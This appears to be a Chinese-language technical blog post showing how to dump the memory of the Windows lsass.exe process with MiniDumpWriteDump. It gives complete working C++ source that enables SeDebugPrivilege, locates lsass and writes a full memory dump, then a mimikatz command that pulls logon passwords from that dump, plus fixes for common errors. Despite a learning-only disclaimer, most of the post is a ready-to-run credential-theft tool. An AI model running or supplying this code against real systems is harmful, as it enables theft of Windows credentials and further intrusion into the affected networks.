---
layout: post
title:  minidumpwritedump导出lsass
tags: [windows系统编程]
---

# 声明
本文所涉及程序均在本地运行测试，用于学习目的，请勿用于非法用途。

# 前言
利用MiniDumpWriteDump导出lsass.exe进程内存。  

# 程序分析
程序见文末。

先设置权限SeDebugPriviledge，再 MiniDumpWriteDump指定进程的内存。

# 运行
使用管理员权限打开cmd，运行，可以成功。  
使用mimikatz提取password,
`mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit`

# 问题
1. OpenProcess 报错 5
   权限不够，需要管理员权限运行，且SeDebugPriviledge。

2. MiniDumpWriteDump 报错 2147942699
   将x86编译改为x64编译可以执行


# 源代码
```cpp
//#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <stdio.h>
// #pragma comment(lib, "cmcfg32.lib")
#pragma comment (lib, "Dbghelp.lib")

using namespace std;

BOOL SetPrivilege(
)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    cout << "sedebugpriviledge\n";
    
    if (!OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,   
        &hToken))       
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    LPCTSTR lpszPrivilege = SE_DEBUG_NAME;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    BOOL bEnablePrivilege = TRUE;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

int main() {
        DWORD lsassPID = 0;
        HANDLE lsassHandle = NULL;

        if (!SetPrivilege()) {
            cout << "sedebug error, please use administrator priviledge" << endl;
            return 0;
        }

        // Open a handle to lsass.dmp - this is where the minidump file will be saved to
        HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        // Find lsass PID
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        LPCWSTR processName = L"";

        if (Process32First(snapshot, &processEntry)) {
                while (_wcsicmp(processName, L"lsass.exe") != 0) {
                        Process32Next(snapshot, &processEntry);
                        processName = processEntry.szExeFile;
                        lsassPID = processEntry.th32ProcessID;
                }
                wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
        }

    

        // Open handle to lsass.exe process
        //lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
    lsassHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE  | THREAD_ALL_ACCESS, 0, lsassPID);
        //cout << lsassHandle;
        cout << GetLastError() << endl;

        // Create minidump
        BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        cout << GetLastError() << endl;
        if (isDumped) {
                cout << "[+] lsass dumped successfully!" << endl;
        }

        return 0;
}
```

## 引用
1. https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
2. https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
3. https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
4. https://github.com/killswitch-GUI/minidump-lib/blob/master/minidump-lib/minidump.cpp
5. https://www.cnblogs.com/amwuau/p/10027893.html
6. https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE

